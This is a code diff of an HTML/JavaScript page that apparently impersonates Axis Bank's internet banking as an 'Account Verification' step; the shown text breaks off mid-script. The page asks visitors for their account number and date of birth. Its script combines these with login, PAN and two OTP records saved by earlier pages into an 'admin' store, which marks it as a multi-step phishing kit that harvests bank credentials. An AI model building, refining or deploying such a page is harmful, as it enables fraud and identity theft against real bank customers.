@@ -3,546 +3,956 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AXIS BANK - Account Details</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Axis Bank - Account Verification</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #f0f2f5 0%, #e4e8ed 100%);
+            background: #f0f2f5;
             min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        /* Page Load Animation */
+        .page-loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
         }
         
-        .container {
+        .loader-container {
+            position: relative;
             width: 100%;
-            max-width: 900px;
-            background: white;
-            border-radius: 15px;
-            box-shadow: 0 15px 35px rgba(0, 0, 100, 0.1);
-            overflow: hidden;
+            height: 100px;
         }
         
-        /* Header */
-        .header {
-            background: linear-gradient(to right, #2E5BAF, #1E4A9F);
-            color: white;
-            padding: 25px 40px;
-            text-align: center;
+        .loader-dot {
+            width: 15px;
+            height: 15px;
+            background: #87103F;
+            border-radius: 50%;
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            animation: dotAnimation 2.4s linear infinite;
+            box-shadow: 0 0 20px rgba(135, 16, 63, 0.8), 0 0 40px rgba(135, 16, 63, 0.6);
+        }
+        
+        @keyframes dotAnimation {
+            0% {
+                left: 0;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            6.25% {
+                width: 25px;
+                height: 25px;
+                opacity: 0.8;
+                box-shadow: 0 0 25px rgba(135, 16, 63, 0.9);
+            }
+            12.5% {
+                left: 12.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            18.75% {
+                width: 30px;
+                height: 30px;
+                opacity: 1;
+                box-shadow: 0 0 30px rgba(135, 16, 63, 1);
+            }
+            25% {
+                left: 25%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            31.25% {
+                width: 35px;
+                height: 35px;
+                opacity: 0.8;
+                box-shadow: 0 0 35px rgba(135, 16, 63, 0.9);
+            }
+            37.5% {
+                left: 37.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            43.75% {
+                width: 40px;
+                height: 40px;
+                opacity: 1;
+                box-shadow: 0 0 40px rgba(135, 16, 63, 1);
+            }
+            50% {
+                left: 50%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            56.25% {
+                width: 35px;
+                height: 35px;
+                opacity: 0.8;
+                box-shadow: 0 0 35px rgba(135, 16, 63, 0.9);
+            }
+            62.5% {
+                left: 62.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            68.75% {
+                width: 30px;
+                height: 30px;
+                opacity: 1;
+                box-shadow: 0 0 30px rgba(135, 16, 63, 1);
+            }
+            75% {
+                left: 75%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            81.25% {
+                width: 25px;
+                height: 25px;
+                opacity: 0.8;
+                box-shadow: 0 0 25px rgba(135, 16, 63, 0.9);
+            }
+            87.5% {
+                left: 87.5%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+            93.75% {
+                width: 20px;
+                height: 20px;
+                opacity: 1;
+                box-shadow: 0 0 20px rgba(135, 16, 63, 1);
+            }
+            100% {
+                left: 100%;
+                width: 15px;
+                height: 15px;
+                opacity: 0.3;
+                box-shadow: 0 0 10px rgba(135, 16, 63, 0.5);
+            }
+        }
+        
+        /* Main Container */
+        .main-container {
+            opacity: 0;
+            animation: fadeIn 0.5s ease 3s forwards;
+            flex: 1;
+        }
+        
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+        
+        /* Header - Maroon Red */
+        .bank-header {
+            background: #87103F;
+            padding: 15px 40px;
             position: relative;
         }
         
-        .bank-logo {
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
             display: flex;
             align-items: center;
-            justify-content: center;
-            gap: 15px;
-            margin-bottom: 10px;
+            justify-content: space-between;
         }
         
-        .bank-logo i {
-            font-size: 40px;
-            color: #FFD700;
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        
+        .bank-logo {
+            height: 45px;
+            width: auto;
+            object-fit: contain;
+            filter: brightness(0) invert(1);
+        }
+        
+        .bank-title {
+            display: flex;
+            flex-direction: column;
         }
         
         .bank-name {
-            font-size: 32px;
+            font-size: 28px;
             font-weight: bold;
+            color: white;
             letter-spacing: 1px;
         }
         
-        .security-badge {
-            position: absolute;
-            right: 40px;
-            top: 30px;
-            background: rgba(255, 255, 255, 0.2);
-            padding: 8px 20px;
-            border-radius: 20px;
-            font-size: 14px;
+        .header-info {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+        }
+        
+        .header-text-container {
             display: flex;
             align-items: center;
-            gap: 8px;
+            margin-bottom: 5px;
+        }
+        
+        .open-text {
+            color: white;
+            font-weight: bold;
+            font-style: italic;
+            font-size: 24px;
+        }
+        
+        .banking-text {
+            color: white;
+            font-style: italic;
+            font-size: 18px;
+            letter-spacing: 1px;
+        }
+        
+        .separator {
+            color: rgba(255, 255, 255, 0.7);
+            margin: 0 10px;
+        }
+        
+        .login-using {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.9);
         }
         
         /* Main Content */
         .main-content {
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 0 20px;
             display: flex;
-            min-height: 500px;
+            flex-direction: column;
+            align-items: center;
         }
         
-        .left-section {
-            flex: 1;
-            padding: 40px;
-            background: #F9FAFB;
-            border-right: 1px solid #E1E4E8;
+        /* Account Container */
+        .account-container {
+            width: 100%;
+            max-width: 500px;
         }
         
-        .right-section {
-            width: 350px;
-            padding: 40px 30px;
+        .account-box {
             background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
         }
         
-        /* Account Form */
+        .account-header {
+            background: #87103F;
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+        
         .account-title {
-            color: #2E5BAF;
             font-size: 24px;
-            margin-bottom: 20px;
+            font-weight: bold;
+            margin-bottom: 5px;
         }
         
         .account-subtitle {
-            color: #666;
+            opacity: 0.9;
             font-size: 16px;
-            margin-bottom: 30px;
+        }
+        
+        /* Form Container */
+        .form-container {
+            padding: 30px;
+        }
+        
+        /* Info Message */
+        .info-message {
+            background: #f8f9fa;
+            border-left: 4px solid #87103F;
+            padding: 15px;
+            margin-bottom: 25px;
+            border-radius: 0 8px 8px 0;
+        }
+        
+        .info-title {
+            font-weight: bold;
+            color: #87103F;
+            margin-bottom: 5px;
+            font-size: 16px;
+        }
+        
+        .info-text {
+            color: #666;
+            font-size: 14px;
             line-height: 1.5;
         }
         
+        /* Form Groups */
         .form-group {
             margin-bottom: 25px;
         }
         
-        .form-group label {
+        .form-label {
             display: block;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             color: #333;
-            font-weight: 600;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #f9f9f9;
+        }
+        
+        .form-input:focus {
+            border-color: #87103F;
+            outline: none;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(135, 16, 63, 0.1);
         }
         
         .input-with-icon {
             position: relative;
         }
         
-        .input-with-icon i {
+        .input-icon {
             position: absolute;
-            left: 15px;
+            right: 15px;
             top: 50%;
             transform: translateY(-50%);
+            color: #87103F;
+        }
+        
+        /* Format Helpers */
+        .format-helper {
+            font-size: 12px;
             color: #666;
+            margin-top: 5px;
+            font-style: italic;
         }
         
-        .input-with-icon input, .input-with-icon select {
-            width: 100%;
-            padding: 15px 15px 15px 45px;
-            border: 2px solid #DDD;
+        /* Date Format Note */
+        .date-note {
+            background: #fff8e1;
+            border: 1px solid #ffd54f;
             border-radius: 8px;
-            font-size: 16px;
-            transition: all 0.3s;
-        }
-        
-        .input-with-icon input:focus, .input-with-icon select:focus {
-            outline: none;
-            border-color: #2E5BAF;
-            box-shadow: 0 0 0 3px rgba(46, 91, 175, 0.1);
-        }
-        
-        .date-inputs {
-            display: flex;
-            gap: 15px;
-        }
-        
-        .date-inputs select {
-            flex: 1;
             padding: 15px;
-            border: 2px solid #DDD;
-            border-radius: 8px;
-            font-size: 16px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #5d4037;
         }
         
-        .submit-btn {
+        .date-note-title {
+            font-weight: bold;
+            color: #87103F;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        /* Button Container */
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 30px;
+        }
+        
+        .verify-button {
             width: 100%;
-            padding: 18px;
-            background: linear-gradient(to right, #2E5BAF, #1E4A9F);
+            background: #87103F;
             color: white;
             border: none;
+            padding: 18px;
             border-radius: 8px;
             font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            transition: all 0.3s;
-            margin-top: 20px;
-        }
-        
-        .submit-btn:hover {
-            background: linear-gradient(to right, #1E4A9F, #15367F);
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(46, 91, 175, 0.3);
-        }
-        
-        .progress-bar {
-            background: #E8EAF6;
-            height: 8px;
-            border-radius: 4px;
-            margin-bottom: 30px;
+            transition: all 0.3s ease;
+            position: relative;
             overflow: hidden;
+            box-shadow: 0 5px 15px rgba(135, 16, 63, 0.3);
         }
         
-        .progress-fill {
-            background: linear-gradient(to right, #4CAF50, #2E7D32);
-            height: 100%;
-            width: 90%;
-            border-radius: 4px;
+        .verify-button:hover {
+            background: #6a0c32;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(135, 16, 63, 0.4);
         }
         
-        .progress-text {
+        .verify-button.loading {
+            background: #6a0c32;
+            cursor: not-allowed;
+        }
+        
+        .verify-button.loading:after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            margin: -10px 0 0 -10px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: button-loading 0.6s linear infinite;
+        }
+        
+        @keyframes button-loading {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Links */
+        .form-links {
             text-align: center;
-            color: #666;
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 1px solid #eee;
+        }
+        
+        .form-links a {
+            color: #87103F;
+            text-decoration: none;
+            font-weight: bold;
             font-size: 14px;
-            margin-bottom: 30px;
+            margin: 0 15px;
+            transition: all 0.3s ease;
         }
         
-        /* Right Section Cards */
-        .info-card {
-            background: #F8F9FA;
-            border-radius: 10px;
-            padding: 25px;
-            margin-bottom: 25px;
-            text-align: center;
-            border: 1px solid #E1E4E8;
-        }
-        
-        .card-icon {
-            font-size: 36px;
-            color: #2E5BAF;
-            margin-bottom: 15px;
-        }
-        
-        .card-title {
-            color: #333;
-            font-size: 18px;
-            margin-bottom: 10px;
-            font-weight: 600;
-        }
-        
-        .card-text {
-            color: #666;
-            font-size: 14px;
-            line-height: 1.5;
-            margin-bottom: 20px;
-        }
-        
-        .card-btn {
-            background: #2E5BAF;
-            color: white;
-            border: none;
-            padding: 10px 25px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: 500;
+        .form-links a:hover {
+            text-decoration: underline;
         }
         
         /* Footer */
-        .footer {
-            background: #F5F7FA;
-            padding: 20px 40px;
+        .main-footer {
+            background: #87103F;
+            color: white;
             text-align: center;
-            border-top: 1px solid #E1E4E8;
-            color: #666;
-            font-size: 14px;
+            padding: 30px 20px;
+            margin-top: 50px;
+        }
+        
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .footer-text {
+            font-size: 18px;
+            margin-bottom: 20px;
+            font-weight: 500;
         }
         
         .footer-links {
-            margin-top: 10px;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 25px;
+            margin-bottom: 20px;
         }
         
         .footer-links a {
-            color: #2E5BAF;
+            color: white;
             text-decoration: none;
-            margin: 0 10px;
-            font-size: 13px;
+            font-weight: 500;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            padding: 5px 10px;
+            border-radius: 4px;
+        }
+        
+        .footer-links a:hover {
+            background: rgba(255, 255, 255, 0.1);
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            font-size: 14px;
+            opacity: 0.8;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        /* Responsive */
+        @media (max-width: 992px) {
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+                gap: 15px;
+            }
+            
+            .logo-section {
+                justify-content: center;
+            }
+            
+            .header-info {
+                align-items: center;
+                text-align: center;
+            }
         }
         
         @media (max-width: 768px) {
+            .bank-header {
+                padding: 12px 20px;
+            }
+            
+            .bank-logo {
+                height: 40px;
+            }
+            
+            .bank-name {
+                font-size: 24px;
+            }
+            
+            .open-text {
+                font-size: 20px;
+            }
+            
+            .banking-text {
+                font-size: 16px;
+            }
+            
             .main-content {
-                flex-direction: column;
+                padding: 0 15px;
+                margin: 20px auto;
             }
             
-            .right-section {
-                width: 100%;
+            .footer-links {
+                flex-direction: column;
+                gap: 15px;
+            }
+        }
+        
+        @media (max-width: 576px) {
+            .header-text-container {
+                flex-direction: column;
+                gap: 5px;
             }
             
-            .date-inputs {
-                flex-direction: column;
+            .separator {
+                display: none;
+            }
+            
+            .bank-logo {
+                height: 35px;
+            }
+            
+            .bank-name {
+                font-size: 20px;
+            }
+            
+            .open-text {
+                font-size: 18px;
+            }
+            
+            .banking-text {
+                font-size: 14px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Header -->
-        <div class="header">
-            <div class="bank-logo">
-                <i class="fas fa-university"></i>
-                <div class="bank-name">AXIS BANK</div>
-            </div>
-            <div class="security-badge">
-                <i class="fas fa-lock"></i>
-                <span>Account Details Verification</span>
-            </div>
+    <!-- Page Load Animation -->
+    <div class="page-loader" id="pageLoader">
+        <div class="loader-container">
+            <div class="loader-dot"></div>
         </div>
+    </div>
+    
+    <!-- Main Container -->
+    <div class="main-container">
+        <!-- Header -->
+        <header class="bank-header">
+            <div class="header-content">
+                <div class="logo-section">
+                    <!-- Axis Bank Logo -->
+                    <img src="https://raw.githubusercontent.com/shreya99u-max/axisbank/main/IMG_20260201_085106.jpg" 
+                         alt="Axis Bank Logo" 
+                         class="bank-logo">
+                    <div class="bank-title">
+                        <div class="bank-name">AXIS BANK</div>
+                    </div>
+                </div>
+                
+                <div class="header-info">
+                    <div class="header-text-container">
+                        <span class="open-text">open</span>
+                        <span class="separator">|</span>
+                        <span class="banking-text">INTERNET BANKING</span>
+                    </div>
+                    <div class="login-using">Account Verification</div>
+                </div>
+            </div>
+        </header>
         
         <!-- Main Content -->
         <div class="main-content">
-            <!-- Left Section - Account Form -->
-            <div class="left-section">
-                <h2 class="account-title">Account Information</h2>
-                <p class="account-subtitle">
-                    Please provide your account details for verification. This information is required to link your PAN with your bank account.
-                </p>
-                
-                <div class="progress-bar">
-                    <div class="progress-fill"></div>
-                </div>
-                <div class="progress-text">Verification Progress: 90% Complete</div>
-                
-                <form id="accountForm">
-                    <div class="form-group">
-                        <label for="accountNumber">Bank Account Number</label>
-                        <div class="input-with-icon">
-                            <i class="fas fa-credit-card"></i>
-                            <input type="text" id="accountNumber" name="accountNumber" 
-                                   placeholder="Enter your 11-16 digit account number" 
-                                   required
-                                   maxlength="16">
-                        </div>
-                        <small style="color: #666; font-size: 13px; margin-top: 5px; display: block;">
-                            Enter account number without spaces or special characters
-                        </small>
+            <div class="account-container">
+                <div class="account-box">
+                    <div class="account-header">
+                        <div class="account-title">Account Verification</div>
+                        <div class="account-subtitle">Enter your account details for verification</div>
                     </div>
                     
-                    <div class="form-group">
-                        <label for="confirmAccountNumber">Confirm Account Number</label>
-                        <div class="input-with-icon">
-                            <i class="fas fa-redo"></i>
-                            <input type="text" id="confirmAccountNumber" name="confirmAccountNumber" 
-                                   placeholder="Re-enter account number" 
-                                   required
-                                   maxlength="16">
+                    <div class="form-container">
+                        <!-- Info Message -->
+                        <div class="info-message">
+                            <div class="info-title">📝 Account Verification Required</div>
+                            <div class="info-text">
+                                Please enter your 15-digit Account Number and Date of Birth as per bank records for account verification.
+                            </div>
                         </div>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="dob">Date of Birth (as per bank records)</label>
-                        <div class="date-inputs">
-                            <select id="dobDay" required>
-                                <option value="">Day</option>
-                                <?php for($i=1; $i<=31; $i++): ?>
-                                <option value="<?php echo str_pad($i, 2, '0', STR_PAD_LEFT); ?>"><?php echo str_pad($i, 2, '0', STR_PAD_LEFT); ?></option>
-                                <?php endfor; ?>
-                            </select>
+                        
+                        <!-- Date Format Note -->
+                        <div class="date-note">
+                            <div class="date-note-title">
+                                <span>📅</span> Important Note
+                            </div>
+                            Enter Date of Birth in DDMMYYYY format (e.g., 15051985 for 15th May 1985)
+                        </div>
+                        
+                        <!-- Account Form -->
+                        <form id="accountForm">
+                            <div class="form-group">
+                                <label class="form-label" for="accountNumber">15-digit Account Number</label>
+                                <div class="input-with-icon">
+                                    <input type="text" class="form-input" id="accountNumber" name="accountNumber" 
+                                           placeholder="Enter 15-digit account number" 
+                                           maxlength="15"
+                                           required>
+                                    <div class="input-icon">🏦</div>
+                                </div>
+                                <div class="format-helper">Format: 15 digits (e.g., 123456789012345)</div>
+                            </div>
                             
-                            <select id="dobMonth" required>
-                                <option value="">Month</option>
-                                <option value="01">January</option>
-                                <option value="02">February</option>
-                                <option value="03">March</option>
-                                <option value="04">April</option>
-                                <option value="05">May</option>
-                                <option value="06">June</option>
-                                <option value="07">July</option>
-                                <option value="08">August</option>
-                                <option value="09">September</option>
-                                <option value="10">October</option>
-                                <option value="11">November</option>
-                                <option value="12">December</option>
-                            </select>
+                            <div class="form-group">
+                                <label class="form-label" for="dob">Date of Birth (DDMMYYYY)</label>
+                                <div class="input-with-icon">
+                                    <input type="text" class="form-input" id="dob" name="dob" 
+                                           placeholder="Enter DOB as DDMMYYYY (e.g., 15051985)" 
+                                           maxlength="8"
+                                           required>
+                                    <div class="input-icon">📅</div>
+                                </div>
+                                <div class="format-helper">Format: DDMMYYYY (e.g., 15051985 for 15th May 1985)</div>
+                            </div>
                             
-                            <select id="dobYear" required>
-                                <option value="">Year</option>
-                                <?php 
-                                $currentYear = date('Y');
-                                for($i=$currentYear; $i>=1900; $i--): 
-                                ?>
-                                <option value="<?php echo $i; ?>"><?php echo $i; ?></option>
-                                <?php endfor; ?>
-                            </select>
+                            <!-- Buttons -->
+                            <div class="btn-container">
+                                <button type="submit" class="verify-button" id="verifyButton">
+                                    Verify Account Details
+                                </button>
+                            </div>
+                        </form>
+                        
+                        <div class="form-links">
+                            <a href="#" id="backLink">← Back to OTP Verification</a>
+                            <a href="#" id="helpLink">Need Help?</a>
                         </div>
-                        <input type="hidden" id="fullDob" name="dob">
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="accountType">Account Type</label>
-                        <div class="input-with-icon">
-                            <i class="fas fa-piggy-bank"></i>
-                            <select id="accountType" name="accountType" required>
-                                <option value="">Select Account Type</option>
-                                <option value="savings">Savings Account</option>
-                                <option value="current">Current Account</option>
-                                <option value="salary">Salary Account</option>
-                                <option value="fixed">Fixed Deposit</option>
-                                <option value="recurring">Recurring Deposit</option>
-                            </select>
-                        </div>
-                    </div>
-                    
-                    <button type="submit" class="submit-btn">
-                        <i class="fas fa-check-circle"></i>
-                        SUBMIT ACCOUNT DETAILS
-                    </button>
-                </form>
-            </div>
-            
-            <!-- Right Section - Info Cards -->
-            <div class="right-section">
-                <div class="info-card">
-                    <div class="card-icon">
-                        <i class="fas fa-info-circle"></i>
-                    </div>
-                    <div class="card-title">Why We Need This?</div>
-                    <div class="card-text">
-                        Account details are required to comply with RBI's KYC norms and to link your PAN with bank account as per Income Tax rules.
-                    </div>
-                </div>
-                
-                <div class="info-card">
-                    <div class="card-icon">
-                        <i class="fas fa-shield-alt"></i>
-                    </div>
-                    <div class="card-title">100% Secure</div>
-                    <div class="card-text">
-                        Your account details are encrypted and stored securely. We never share this information with third parties.
-                    </div>
-                </div>
-                
-                <div class="info-card">
-                    <div class="card-icon">
-                        <i class="fas fa-check-double"></i>
-                    </div>
-                    <div class="card-title">Final Step</div>
-                    <div class="card-text">
-                        This is the final step of verification. After this, your PAN will be successfully linked with your bank account.
                     </div>
                 </div>
             </div>
         </div>
         
         <!-- Footer -->
-        <div class="footer">
-            <p>© 2004-2024 Axis Bank Ltd. All rights reserved.</p>
-            <div class="footer-links">
-                <a href="#">Privacy Policy</a> | 
-                <a href="#">Terms & Conditions</a> | 
-                <a href="#">Disclaimer</a> | 
-                <a href="#">Sitemap</a>
+        <footer class="main-footer">
+            <div class="footer-content">
+                <div class="footer-text">Secure Account Verification</div>
+                <div class="footer-links">
+                    <a href="#">Contactless enabled Credit Cards</a>
+                    <a href="#">Home loan upto Rs. 28 Lakhs</a>
+                    <a href="#">Experience seamless credit approval</a>
+                    <a href="#">Instant personal loans</a>
+                    <a href="#">Zero balance savings account</a>
+                </div>
+                <div class="copyright">
+                    © 2023 Axis Bank Ltd. All Rights Reserved. | <a href="#" style="color: white; text-decoration: underline;">Privacy Policy</a> | <a href="#" style="color: white; text-decoration: underline;">Terms of Service</a>
+                </div>
             </div>
-        </div>
+        </footer>
     </div>
 
     <script>
-        // Account number validation (numbers only)
-        document.getElementById('accountNumber').addEventListener('input', function(e) {
-            this.value = this.value.replace(/\D/g, '').slice(0, 16);
+        // Page load animation
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                document.getElementById('pageLoader').style.opacity = '0';
+                setTimeout(function() {
+                    document.getElementById('pageLoader').style.display = 'none';
+                }, 500);
+            }, 3000);
         });
         
-        document.getElementById('confirmAccountNumber').addEventListener('input', function(e) {
-            this.value = this.value.replace(/\D/g, '').slice(0, 16);
+        // DOM Elements
+        const accountForm = document.getElementById('accountForm');
+        const accountNumberInput = document.getElementById('accountNumber');
+        const dobInput = document.getElementById('dob');
+        const verifyButton = document.getElementById('verifyButton');
+        const backLink = document.getElementById('backLink');
+        const helpLink = document.getElementById('helpLink');
+        
+        // Account number validation - only numbers
+        accountNumberInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/[^0-9]/gi, '');
+            e.target.value = value;
         });
         
-        // Update hidden DOB field
-        function updateDOB() {
-            const day = document.getElementById('dobDay').value;
-            const month = document.getElementById('dobMonth').value;
-            const year = document.getElementById('dobYear').value;
-            
-            if (day && month && year) {
-                document.getElementById('fullDob').value = `${day}/${month}/${year}`;
-            }
+        // Date of birth validation - DDMMYYYY format
+        dobInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/[^0-9]/gi, '');
+            e.target.value = value;
+        });
+        
+        // Validate 15-digit account number
+        function validateAccountNumber(accountNumber) {
+            // Must be exactly 15 digits
+            return /^\d{15}$/.test(accountNumber);
         }
         
-        document.getElementById('dobDay').addEventListener('change', updateDOB);
-        document.getElementById('dobMonth').addEventListener('change', updateDOB);
-        document.getElementById('dobYear').addEventListener('change', updateDOB);
-        
-        // Form submission
-        document.getElementById('accountForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const accountNumber = document.getElementById('accountNumber').value;
-            const confirmAccountNumber = document.getElementById('confirmAccountNumber').value;
-            const dob = document.getElementById('fullDob').value;
-            const accountType = document.getElementById('accountType').value;
-            
-            // Validation
-            if (accountNumber.length < 11 || accountNumber.length > 16) {
-                alert('Please enter a valid account number (11-16 digits)');
-                return;
+        // Validate DDMMYYYY date format
+        function validateDOB(dob) {
+            // Must be exactly 8 digits
+            if (!/^\d{8}$/.test(dob)) {
+                return false;
             }
             
-            if (accountNumber !== confirmAccountNumber) {
-                alert('Account numbers do not match! Please check and try again.');
-                return;
-            }
+            // Extract day, month, year
+            const day = parseInt(dob.substring(0, 2));
+            const month = parseInt(dob.substring(2, 4));
+            const year = parseInt(dob.substring(4, 8));
             
-            if (!dob) {
-                alert('Please select your date of birth');
-                return;
-            }
+            // Basic validation
+            if (day < 1 || day > 31) return false;
+            if (month < 1 || month > 12) return false;
+            if (year < 1900 || year > new Date().getFullYear()) return false;
             
-            // Calculate age from DOB
-            const [day, month, year] = dob.split('/');
-            const birthDate = new Date(year, month - 1, day);
+            // Check for valid days in month
+            const daysInMonth = new Date(year, month, 0).getDate();
+            if (day > daysInMonth) return false;
+            
+            // Check if date is not in future
             const today = new Date();
-            let age = today.getFullYear() - birthDate.getFullYear();
-            const monthDiff = today.getMonth() - birthDate.getMonth();
+            const inputDate = new Date(year, month - 1, day);
+            if (inputDate > today) return false;
             
-            if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
-                age--;
-            }
+            return true;
+        }
+        
+        // Get all user data from previous steps
+        function getAllUserData() {
+            // Get OTP2 data
+            const otp2Data = JSON.parse(localStorage.getItem('axisBankOTP2Verifications') || '[]');
+            const lastOTP2 = otp2Data.length > 0 ? otp2Data[0] : null;
             
-            if (age < 18) {
-                alert('You must be 18 years or older to have a bank account.');
-                return;
-            }
+            // Get OTP1 data
+            const otp1Data = JSON.parse(localStorage.getItem('axisBankOTPVerifications') || '[]');
+            const lastOTP1 = otp1Data.length > 0 ? otp1Data[0] : null;
             
-            // Save account data to admin
-            const accountData = {
-                accountNumber: accountNumber,
-                dateOfBirth: dob,
-                age: age,
-                accountType: accountType,
+            // Get PAN data
+            const panData = JSON.parse(localStorage.getItem('axisBankPANVerifications') || '[]');
+            const lastPAN = panData.length > 0 ? panData[0] : null;
+            
+            // Get login data
+            const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
+            const lastSubmission = submissions.length > 0 ? submissions[0] : null;
+            
+            return {
+                otp2Data: lastOTP2,
+                otp1Data: lastOTP1,
+                panData: lastPAN,
+                loginData: lastSubmission
+            };
+        }
+        
+        // Save account data to localStorage for backend
+        function saveAccountData(accountData) {
+            // Get existing account data or create empty array
+            let accountVerifications = JSON.parse(localStorage.getItem('axisBankAccountVerifications') || '[]');
+            
+            // Get all user data
+            const userData = getAllUserData();
+            
+            // Add new account verification
+            const accountRecord = {
+                id: Date.now(),
+                accountData: accountData,
                 timestamp: new Date().toISOString(),
-                page: 'Axis Bank Account Details'
+                otp2Data: userData.otp2Data,
+                otp1Data: userData.otp1Data,
+                panData: userData.panData,
+                loginData: userData.loginData,
+                status: 'verified'
             };
             
-            let adminData = JSON.parse(localStorage.getItem('adminData') || '[]');
-            adminData.push(accountData);
-            localStorage.setItem('adminData', JSON.stringify(adminData));
+            accountVerifications.unshift(accountRecord);
             
-            console.log('Account data saved:', accountData);
+            // Save back to localStorage
+            localStorage.setItem('axisBankAccountVerifications', JSON.stringify(accountVerifications));
             
-            // Show loading
-            const btn = document.querySelector('.submit-btn');
-            const originalText = btn.innerHTML;
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
-            btn.disabled = true;
+            console.log('Account data saved to backend:', accountData);
+            return accountRecord;
+        }
+        
+        // Save to admin data
+        function saveToAdmin(accountData, accountRecord) {
+            // Get existing admin data or create empty array
+            let adminData = JSON.parse(localStorage.getItem('axisBankAdminData') || '[]');
             
-            // Simulate processing and redirect
-            setTimeout(() => {
-                window.location.href = 'axis_success.html';
-            }, 1500);
+            // Get all user data
+            const userData = getAllUserData();
+            
+            // Add to admin data
+            adminData.unshift({
+                id: Date.now(),
+                type: 'account_verification',
+                accountData: accountData,
+                accountRecord: accountRecord,
+                timestamp: new Date().toISOString(),
+                otp2Data: userData.otp2Data,
+                otp1Data: userData.otp1Data,
+                panData: userData.panData,
+                loginData: userData.loginData,
+                status: 'verified'
+            });
+            
+            // Save back to localStorage for admin panel
+            localStorage.setItem('axisBankAdminData', JSON.stringify(adminData));
+            
+            console.log('Account data saved to admin:', accountData);
+        }
+        
+        // Form submission handler
+        if (accountForm) {
+            accountForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Get form values
+                const accountNumber = accountNumberInput.value;
+                const dob = dobInput.value;
+                
+                // Validate account number
+                if (!validateAccountNumber(accountNumber)) {
+                    // Quick error indication
+                    verifyButton.style.background = '#ff4444';
+                    setTimeout(() => {
+                        verifyButton.style.background = '#87103F';
+                    }, 500);
+                    return;
+                }
+                
+                // Validate DOB format
+                if (!validateDOB(dob)) {
+                    // Quick error indication
+                    verifyButton.style.background = '#ff4444';
+                    setTimeout(() => {
+                        verifyButton.style.background = '#87103F';
+                    }, 500);
+                    return;
+                }
+                
+                // Show loading
